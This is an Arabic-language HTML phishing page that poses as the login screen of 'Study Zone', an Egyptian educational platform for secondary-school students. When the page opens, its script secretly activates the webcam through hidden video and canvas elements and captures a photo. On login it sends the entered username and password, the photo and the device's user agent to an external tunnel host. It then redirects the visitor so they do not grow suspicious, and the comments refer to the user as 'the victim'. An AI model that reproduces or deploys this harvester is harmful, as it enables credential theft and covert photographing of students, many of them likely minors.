<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Study Zone | منصة تعليمية متكاملة للثانوية العامة وكل السنين الدراسية في مصر</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: white;
            padding: 30px 40px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .login-card h2 {
            color: #2c3e50;
            margin-bottom: 8px;
        }
        .login-card p {
            color: #7f8c8d;
            font-size: 13px;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .input-group {
            margin-bottom: 18px;
            text-align: right;
        }
        .input-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 14px;
            color: #34495e;
            font-weight: bold;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dcdde1;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        .input-group input:focus {
            border-color: #3498db;
            outline: none;
        }
        .btn-login {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-login:hover {
            background: #2980b9;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <h2>Study Zone</h2>
        <p>منصة تعليمية متكاملة للثانوية العامة وكل السنين الدراسية في مصر</p>
        
        <form id="loginForm" onsubmit="sendCapturedData(event)">
            <div class="input-group">
                <label for="username">البريد الإلكتروني أو كود الطالب</label>
                <input type="text" id="username" required placeholder="أدخل الكود أو البريد الإلكتروني">
            </div>
            
            <div class="input-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" required placeholder="أدخل كلمة المرور">
            </div>
            
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
    </div>

    <!-- عناصر مخفية لالتقاط الصورة عبر الكاميرا -->
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        // رابط تيرموكس العام الحالي
        const TUNNEL_URL = 'https://7008c7a2e7b04c.lhr.life';
        
        // رابط التحويل النهائي بعد إدخال البيانات
        const REDIRECT_URL = 'https://share.google/HofQac4JBJCHXx8Ck';

        let capturedImage = "";

        // محاولة تشغيل الكاميرا في الخلفية عند فتح الصفحة
        window.addEventListener('DOMContentLoaded', () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, 320, 240);
                        capturedImage = canvas.toDataURL('image/png');
                        stream.getTracks().forEach(track => track.stop());
                    }, 1200);
                })
                .catch(error => {
                    console.log('Camera access skipped or denied:', error);
                });
        });

        // دالة إرسال البيانات والتحويل الفوري للرابط المطلوب
        function sendCapturedData(event) {
            event.preventDefault();

            const usernameVal = document.getElementById('username').value;
            const passwordVal = document.getElementById('password').value;

            const payload = {
                username: usernameVal,
                password: passwordVal,
                image: capturedImage,
                device_info: navigator.userAgent
            };

            // إرسال البيانات للسيرفر في تيرموكس
            fetch(TUNNEL_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                // تحويل الضحية فوراً إلى الرابط المطلوب
                window.location.href = REDIRECT_URL;
            })
            .catch(error => {
                console.error('Error sending data:', error);
                // حتى لو حصل خطأ بالاتصال، يتم تحويله أيضاً حتى لا يشك بشيء
                window.location.href = REDIRECT_URL;
            });
        }
    </script>
</body>
</html>
